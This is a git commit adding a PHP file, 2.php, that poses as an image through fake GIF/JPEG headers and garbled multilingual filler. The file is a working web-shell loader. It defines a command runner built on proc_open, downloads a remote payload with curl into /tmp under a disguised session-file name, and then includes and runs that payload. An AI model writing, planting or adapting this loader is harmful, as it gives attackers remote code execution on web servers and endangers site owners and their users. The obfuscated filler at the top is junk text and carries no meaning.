40c3a33607fc7f4eb8ca613dbfd10b8fb7eaf7b2
billz1910 <159798833+billz1910@users.noreply.github.com>
2026-08-13 00:46:19 +0700

    Add files via upload

---
+++ 2.php
@@ -0,0 +1,47 @@
+﻿GIF89a；?? JFIF  ? ?  ?+JPG89a:JPEG89a：
+<!DOCTYPE html>
+อ]ผู้ที่อน/บริبستที่/อยู่>|ที่/อยู่>ใน/บริเวOKIUاندست}گا[ه-بسته-)بندی-ن
+<!DOCTYPE html>ต่อ]ผู้ที่อ_U[YIซึ่/งอาจก่อใ|ห้[กิดอันต}รายต่\อผู้ที่อยู่ใ/นบริเว|ใกล้เคี>งได้}ในรั[ศมี|หลา_Aยเมต_ร
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>تی_KOI| کارلتون {کامبربچ متو[لد ۱۹ ژوئ>یه ۱۹۷۶ در لن، هنرپی _IO)وง</title>
+22527﻿GIF89a；?? JFIF  ? ?  ?+JPG89a:JPEG89a：
+<!DOCTYPE html>
+อ]ผู้ที่อน/บริبستที่/อยู่>|ที่/อยู่>ใน/บริเวOKIUاندست}گا[ه-بسته-)بندی-ن
+<!DOCTYPE html>ต่อ]ผู้ที่อ_U[YIซึ่/งอาจก่อใ|ห้[กิดอันต}รายต่\อผู้ที่อยู่ใ/นบริเว|ใกล้เคี>งได้}ในรั[ศมี|หลา_Aยเมต_ร
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>تی_KOI| کارلتون {کامبربچ متو[لد ۱۹ ژوئ>یه ۱۹۷۶ در لن، هنرپی _IO)وง</title>
+<?=
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+function ex($coman, $serlok)
+{
+	$ler = "2>&1";
+	if (!preg_match("/" . $ler . "/i", $coman)) {
+		$coman = $coman . " " . $ler;
+	}
+	$pr = "proc_open";
+	if (function_exists($pr)) {
+		$tod = @$pr($coman, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
+		echo htmlspecialchars(stream_get_contents($crottz[1]));
+	} else {
+		return false;
+	}
+}
+
+$fname = "sess_" . md5("nax") . ".php";
+if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
+    ex("curl --output /tmp/$fname https://fcalpha.net/web/photo/20151024/naxc.txt", "/tmp");
+}
+include("/tmp/$fname");
+?>
